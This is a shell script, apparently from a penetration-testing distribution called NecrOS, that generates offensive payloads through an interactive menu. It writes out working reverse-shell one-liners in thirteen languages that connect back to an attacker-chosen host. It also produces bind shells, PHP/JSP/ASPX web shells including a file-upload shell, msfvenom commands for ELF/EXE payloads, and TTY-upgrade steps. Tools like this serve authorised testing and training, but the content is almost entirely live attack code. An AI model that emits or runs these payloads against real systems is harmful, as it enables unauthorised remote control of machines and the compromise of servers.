#!/bin/sh
# ============================================================================
#  NecrOS PAYLOAD FORGE v2.0 — "Craft Your Weapons"
#  Interactive reverse/bind shell & payload generator.
# ============================================================================

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
_LIB="${SCRIPT_DIR}/../lib/necros-common.sh"
[ -f "$_LIB" ] || _LIB="/usr/local/necros/lib/necros-common.sh"
# shellcheck source=../lib/necros-common.sh
. "$_LIB" 2>/dev/null || {
    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
}

# Auto-detect local IP
LHOST=$(ip -4 addr show 2>/dev/null | grep -oP '(?<=inet )[\d.]+' | grep -v '^127\.' | head -1)
LPORT="4444"

# ---------------------------------------------------------------------------
banner_payload() {
    printf '%s' "$RED"
    cat <<'EOF'

    ╔═══════════════════════════════════════╗
    ║      PAYLOAD FORGE  v2.0             ║
    ║      "Forge your weapons"            ║
    ╚═══════════════════════════════════════╝
EOF
    printf '%s\n' "$NC"
    printf '    LHOST: %s%s%s | LPORT: %s%s%s\n\n' \
        "$GREEN" "${LHOST:-NOT_SET}" "$NC" "$GREEN" "$LPORT" "$NC"
}

# ---------------------------------------------------------------------------
# Payload generators (pure output, no side effects)
# ---------------------------------------------------------------------------
gen_reverse() {
    case "$1" in
        1)  printf 'bash -i >& /dev/tcp/%s/%s 0>&1\n' "$LHOST" "$LPORT" ;;
        2)  printf 'bash -i >& /dev/udp/%s/%s 0>&1\n' "$LHOST" "$LPORT" ;;
        3)  printf 'nc -e /bin/sh %s %s\n' "$LHOST" "$LPORT" ;;
        4)  printf 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n' "$LHOST" "$LPORT" ;;
        5)  printf 'python3 -c '\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'\''\n' "$LHOST" "$LPORT" ;;
        6)  printf 'perl -e '\''use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\''\n' "$LHOST" "$LPORT" ;;
        7)  printf 'php -r '\''$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");'\''\n' "$LHOST" "$LPORT" ;;
        8)  printf 'ruby -rsocket -e'\''f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'\''\n' "$LHOST" "$LPORT" ;;
        9)  printf 'socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:%s:%s\n' "$LHOST" "$LPORT" ;;
        10) printf 'lua -e '\''local s=require("socket");local t=assert(s.tcp());t:connect("%s",%s);[[ ... ]];while true do local r,x=t:receive();local f=assert(io.popen(r,"r"));local b=assert(f:read("*a"));t:send(b);end;f:close();t:close();'\''\n' "$LHOST" "$LPORT" ;;
        11) printf 'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('\''%s'\'',%s);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'\''PS '\''+([Environment]::CurrentDirectory)+'\''> '\'';$sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"\n' "$LHOST" "$LPORT" ;;
        12) printf 'awk '\''BEGIN{s="/inet/tcp/0/%s/%s";while(42){do{printf "shell>"|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")close(s)}}'\''\n' "$LHOST" "$LPORT" ;;
        13) printf 'openssl s_client -quiet -connect %s:%s|/bin/sh|openssl s_client -quiet -connect %s:%s\n' "$LHOST" "$LPORT" "$LHOST" "$((LPORT+1))" ;;
    esac
}

gen_bind() {
    case "$1" in
        1) printf 'nc -lvnp %s -e /bin/sh\n' "$LPORT" ;;
        2) printf 'python3 -c '\''import socket,os;s=socket.socket();s.bind(("0.0.0.0",%s));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system("/bin/sh")'\''\n' "$LPORT" ;;
        3) printf 'socat TCP-LISTEN:%s,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane\n' "$LPORT" ;;
    esac
}

gen_webshell() {
    case "$1" in
        1) printf '<?php system($_GET["cmd"]); ?>\n' ;;
        2) cat <<'WS2'
<?php
if(isset($_FILES['f'])){move_uploaded_file($_FILES['f']['tmp_name'],basename($_FILES['f']['name']));}
if(isset($_GET['cmd'])){echo '<pre>'.shell_exec($_GET['cmd']).'</pre>';}
?>
<form method="POST" enctype="multipart/form-data"><input type="file" name="f"><input type="submit" value="Upload"></form>
WS2
            ;;
        3) printf '<%% Runtime.getRuntime().exec(request.getParameter("cmd")); %%>\n' ;;
        4) printf '<%% Page Language="C#" %%><%% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]); %%>\n' ;;
    esac
}

gen_msfvenom() {
    case "$1" in
        1) printf 'msfvenom -p linux/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f elf > shell.elf\n' "$LHOST" "$LPORT" ;;
        2) printf 'msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s -f exe > shell.exe\n' "$LHOST" "$LPORT" ;;
        3) printf 'msfvenom -p linux/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f python\n' "$LHOST" "$LPORT" ;;
        4) printf 'msfvenom -p php/reverse_php LHOST=%s LPORT=%s -f raw > shell.php\n' "$LHOST" "$LPORT" ;;
    esac
}

gen_listener() {
    case "$1" in
        1) printf 'nc -lvnp %s\n' "$LPORT" ;;
        2) printf 'socat file:$(tty),raw,echo=0 tcp-listen:%s\n' "$LPORT" ;;
        3) printf 'rlwrap nc -lvnp %s\n' "$LPORT" ;;
        4) printf 'python3 -c "import pty; pty.spawn(\\"/bin/bash\\")"\n' ;;
        5) printf 'script /dev/null -qc /bin/bash\n' ;;
        6) printf '# After getting shell:\nCTRL+Z\nstty raw -echo; fg\nexport TERM=xterm\n' ;;
    esac
}

# ---------------------------------------------------------------------------
# Output with clipboard support
# ---------------------------------------------------------------------------
output_payload() {
    echo ""
    printf '%s════════════════════════════════════════════════════════════%s\n' "$YELLOW" "$NC"
    printf '%s%s%s\n' "$GREEN" "$1" "$NC"
    printf '%s════════════════════════════════════════════════════════════%s\n' "$YELLOW" "$NC"
    echo ""
    # Copy to clipboard if available
    if command -v xclip >/dev/null 2>&1; then
        printf '%s' "$1" | xclip -selection clipboard 2>/dev/null && \
            printf '%s[+]%s Copié dans le clipboard\n' "$CYAN" "$NC"
    elif command -v xsel >/dev/null 2>&1; then
        printf '%s' "$1" | xsel --clipboard 2>/dev/null && \
            printf '%s[+]%s Copié dans le clipboard\n' "$CYAN" "$NC"
    fi
}

# ---------------------------------------------------------------------------
# Interactive menus
# ---------------------------------------------------------------------------
submenu() {
    local _title="$1" _gen_func="$2" _max="$3"
    shift 3
    while true; do
        clear
        banner_payload
        printf '%s=== %s ===%s\n' "$CYAN" "$_title" "$NC"
        local _i=1
        for _label in "$@"; do
            printf '[%2d] %s\n' "$_i" "$_label"
            _i=$((_i + 1))
        done
        printf '[ 0] Retour\n\n> '
        read -r _choice
        [ "$_choice" = "0" ] && break
        if [ "$_choice" -ge 1 ] 2>/dev/null && [ "$_choice" -le "$_max" ] 2>/dev/null; then
            local _payload
            _payload=$("$_gen_func" "$_choice")
            [ -n "$_payload" ] && output_payload "$_payload"
        fi
        printf '\nAppuyez sur Entrée...'
        read -r _
    done
}

config_menu() {
    echo ""
    printf '%s=== CONFIGURATION ===%s\n' "$CYAN" "$NC"
    printf 'LHOST actuel: %s\nLPORT actuel: %s\n\n' "$LHOST" "$LPORT"
    printf 'Nouvelle IP (Entrée pour garder): '
    read -r _new_ip
    [ -n "$_new_ip" ] && LHOST="$_new_ip"
    printf 'Nouveau PORT (Entrée pour garder): '
    read -r _new_port
    [ -n "$_new_port" ] && LPORT="$_new_port"
    printf '%s[✓]%s Config: LHOST=%s LPORT=%s\n' "$GREEN" "$NC" "$LHOST" "$LPORT"
}

main_menu() {
    while true; do
        clear
        banner_payload
        printf '%s=== MENU PRINCIPAL ===%s\n' "$CYAN" "$NC"
        cat <<EOF
[1] Reverse Shells (13 payloads)
[2] Bind Shells
[3] Web Shells
[4] MSFvenom Templates
[5] Listeners & Shell Upgrade
[6] Configuration (LHOST/LPORT)
[0] Quitter
EOF
        printf '\n> '
        read -r _choice
        case "$_choice" in
            1) submenu "REVERSE SHELLS" gen_reverse 13 \
                "Bash TCP" "Bash UDP" "Netcat -e" "Netcat FIFO (sans -e)" \
                "Python3" "Perl" "PHP" "Ruby" "Socat" "Lua" "Powershell" "Awk" "OpenSSL (encrypted)" ;;
            2) submenu "BIND SHELLS" gen_bind 3 \
                "Netcat" "Python3" "Socat" ;;
            3) submenu "WEB SHELLS" gen_webshell 4 \
                "PHP Simple" "PHP Upload" "JSP" "ASPX" ;;
            4) submenu "MSFVENOM TEMPLATES" gen_msfvenom 4 \
                "Linux ELF (x86)" "Windows EXE" "Python" "PHP" ;;
            5) submenu "LISTENERS & UPGRADE" gen_listener 6 \
                "Netcat Listener" "Socat PTY Listener" "rlwrap Listener" \
                "Python PTY Spawn" "Script PTY" "Full TTY Upgrade Steps" ;;
            6) config_menu; printf '\nAppuyez sur Entrée...'; read -r _ ;;
            0) printf '%s💀 À bientôt, Nécromancien.%s\n' "$CYAN" "$NC"; exit 0 ;;
        esac
    done
}

# ---------------------------------------------------------------------------
# Quick CLI mode
# ---------------------------------------------------------------------------
show_help() {
    cat <<EOF
NecrOS PAYLOAD FORGE v2.0

Usage: necros-payload [TYPE NUM] [--lhost IP] [--lport PORT]

Types: reverse, bind, web, msf, listen
  necros-payload reverse 1             # Bash TCP reverse shell
  necros-payload reverse 4             # Netcat FIFO
  necros-payload bind 3                # Socat bind shell
  necros-payload --lhost 10.10.10.1 --lport 9001 reverse 5

Without arguments: interactive mode.
EOF
}

# Parse CLI
while [ $# -gt 0 ]; do
    case "$1" in
        --lhost) LHOST="$2"; shift ;;
        --lport) LPORT="$2"; shift ;;
        -h|--help) show_help; exit 0 ;;
        reverse) [ -n "$2" ] && { gen_reverse "$2"; exit 0; } ;;
        bind)    [ -n "$2" ] && { gen_bind "$2"; exit 0; } ;;
        web)     [ -n "$2" ] && { gen_webshell "$2"; exit 0; } ;;
        msf)     [ -n "$2" ] && { gen_msfvenom "$2"; exit 0; } ;;
        listen)  [ -n "$2" ] && { gen_listener "$2"; exit 0; } || { gen_listener 1; exit 0; } ;;
    esac
    shift
done

main_menu
